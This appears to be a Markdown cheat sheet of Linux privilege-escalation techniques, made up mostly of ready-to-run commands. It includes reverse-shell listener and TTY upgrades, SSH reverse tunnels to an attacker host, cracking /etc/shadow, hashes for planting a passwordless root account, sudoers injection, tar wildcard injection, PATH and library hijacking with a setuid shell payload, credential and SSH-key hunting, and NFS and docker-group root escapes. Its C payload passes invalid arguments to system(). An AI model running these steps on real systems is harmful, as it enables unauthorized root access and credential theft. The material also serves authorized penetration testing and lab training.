!!! note
    It is not always possible to escalate privileges to root, we have to escalate privileges to another non-root user, then escalate privileges to root

## Upgrade dumb shell

### Spawn TTY shell

Use `rlwrap` to listening will enhance the shell, allowing to use arrow keys and clear the screen with `[Ctrl]+[L]`

```bash
rlwrap nc -nlvp 443
```

Or want to use su, nano and autocomplete (TAB), let's spawn a TTY shell from an interpreter:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
```

```bash
ruby: exec "/bin/sh"
```

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Upgrading from nc with magic

To see more about your term, row, column information, use the following command on the attacker terminal:

```bash
echo $TERM && tput lines && tput cols
```

Then, run commands on victim reverse shell:

```
export SHELL=bash
export TERM=xterm-256color
```

Press `[Ctrl] + [z]`

```
stty raw -echo; fg
```

```
stty rows 41 columns 209
```

## Enumerate Basic information

Get current user context and hostname

```bash
id && hostname
```

## Running processes & Service Exploits

**Enumerate running process**

```bash
ps aux
ps aux | grep root
```

**Enumerate local ports**

```bash
netstat -ano
```

```bash
ss -anp
```

If the ports only allow internal access, use port forwarding techniques.
Port forwarding from victim machine (SSH server listen on attacker):

```
ssh -f -N -R 3306:127.0.0.1:3306 kali@192.168.49.10
```

Port forwarding from attacker machine (SSH server listen on victim):

```
ssh -f -N -L 3306:127.0.0.1:3306 user@192.168.10.10
```

## Weak File Permissions

List world writable files on the system.

```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### /etc/shadow

!!! info
    The /etc/shadow file contains user password hashes

Get /etc/shadow permissions

```bash
ls -l /etc/shadow
```

#### Readable /etc/shadow

```bash
cat /etc/shadow
```

Save the root user (or someone you want to privilege escalate to) to a file and use `john` to crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Finally, switch user with cracked password

```bash
su root
```

#### Writable /etc/shadow

Generate a new password:

```bash
mkpasswd -m sha-512 newpassword
```

Edit the /etc/shadow file and replace the root password hash. Finally, switch user with new password. Here is the empty password hash

```
root:$6$1.kHoCdgGLxINgw$TQbdEgrYcctS4/o7EKtmWaxwBoOHaeU2nK4B66Any.4ksSyb5FFedubBtSs.Rc9DkxD02ju7RfK/I0U8MXdb50:17298:0:99999:7:::
```

### Writable /etc/passwd

!!! info
    The /etc/passwd file contains information about user accounts. It usually only readable.


Get /etc/passwd permissions

```bash
ls -l /etc/passwd
```

Generate a new password

```bash
openssl passwd newpassword
```

Then, copy the root user row, replace username with and the "x" field with the new password to create new root user. Here is a new user with username is `lithonn` and password is empty (empty not "empty")

```
lithonn:lF/bBdY9ikuzY:0:0:root:/root:/bin/bash
```

### Writable /etc/sudoers

```bash
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## Sudo

!!! info
    The `sudo` command allows user to run a program with root privileges. In some cases you may have permission to run some commands with sudo privileges without a password.

```bash
sudo -l
```

!!! warning
    Use the same command as in the output of the `sudo -l` command, without shortening.

## Cron Jobs

!!! info
    Cron jobs are programs/scripts run at specific times or interval.

```bash
ls -lah /etc/cron*
```

```bash
cat /etc/crontab
```

```bash
crontab -l
```

**Cron job watching**

Some cron process of root can not to find by listing, Use [pspy](https://github.com/DominicBreuker/pspy) to monitor process

```
./pspy64 -pf -i 1000 
```

Then, try to modify or injection the cron job script.

### File permissions

The cron job script can be modify by non owner user. Depending on the situation, we can replace the script with:

- Our reverse shell
- Set SUID for /bin/bash (or other program)
- Change/Create root user
- ...

### PATH Environment Variable

Look for PATH variable in `/etc/crontab`

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

...
```

Then, check the permission on `/home/user`, if have write permssion, replace the cron job execute script.

### Wildcards injection

Backup scripts often use `tar` to create compress files. If using tar with wildcard (*), wildcard injection technique can be used to exploit.

Create 2 files with names: `--checkpoint=1` and `--checkpoint-action=exec=shell.elf`

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Wait for cron job to compress files. The tar command will interpret files `--checkpoint=1` and `--checkpoint-action=exec=shell.elf` as 2 options instead of file names.

See more exploits at https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

!!! note
    Can use this exploit with SUID


## SUID/SGID

The SUID/SGID allows files to be executed with the permission level of the file owner or the group owner.

Enumerate for SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

### SUID Known Exploits

See how to exploit on [GTFOBins](https://gtfobins.github.io) and [ExploitDB](https://www.exploit-db.com/)

### SUID Environment variables

Use `strings` to look for relative path program. Example: call `service` instead of `/usr/bin/service`

```bash
strings /usr/bin/suidprogram
```

Then, create a fake program

```bash
echo "bash -p" > /tmp/service
```

Add /tmp to `$PATH`

```bash
export PATH=/tmp:$PATH
```

Finally, run the SUID

### Dynamic Library Hijacking

Check SUID share library

```bash
ldd /usr/bin/suidprogram
```

Determine which share library configuration files available

```bash
ls -l /etc/ld.so.conf.d/
```

Build C++ privilege escalation code

```C++
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void say_hi(){
    setuid(0); setgid(0); system("/bin/sh",NULL,NULL);
}
```

```bash
export PATH
```

Recheck the the SUID

```bash
ldd /usr/bin/suidprogram
```

Finally, run the SUID.

## Password & SSH keys

### Passwords

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

!!! note
    Use "PASS" instead of "PASSWORD" for more result

### SSH keys

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

## NFS

Read the /etc/exports file

```bash
cat /etc/exports
```

Look for the **no_root_squash** or **no_all_squash** flag. If the directory that is configured this flag, you can mounting and write to this directory as root. Example:

```bash
user@victim:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/share localhost(rw,sync,no_root_squash)
```

Mount the directory to kali (If only for localhost, use port forwarding technique)

```bash
mkdir /tmp/mounting
mount -t nfs <Victim IP>:<SHARED_FOLDER> /tmp/mounting
cp /bin/bash /tmp/mounting
chmod +s /tmp/mounting/bash
```

Then, run our file on victim:

```bash
cd <SHARED_FOLDER>
./bash -p
```

## Capabilities

!!! info
    Capabilities in Linux  allow them specific privileges that are normally reserved for root-level actions (intercept network traffic, mount/unmount file systems, ...)

Listing capabilities of binaries

```bash
/usr/bin/getcap -r  /usr/bin
```

Interesting capabilities

- openssl=ep (Exploit: https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

## Groups

### Docker Group

Mount the `/` to container

```bash
docker pull alpine
docker run -v /:/mnt -it alpine /bin/sh
```

### Disk Group

!!! info
    The disk group can manage disks.

Find where the root (`/`) mounted

```bash
df -h | grep "/$"
```

```bash
$ debugfs /dev/sda5
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
```

### Adm Group

!!! info
    Group adm have permissions to read log files located inside /var/log/

```
find / -group adm 2>/dev/null | grep -v 'proc' | xargs ls -l 2>/dev/null
```

## Kernel exploit

```bash
uname -a
```

```bash
cat /etc/issue
```

```bash
cat /etc/*-release
```
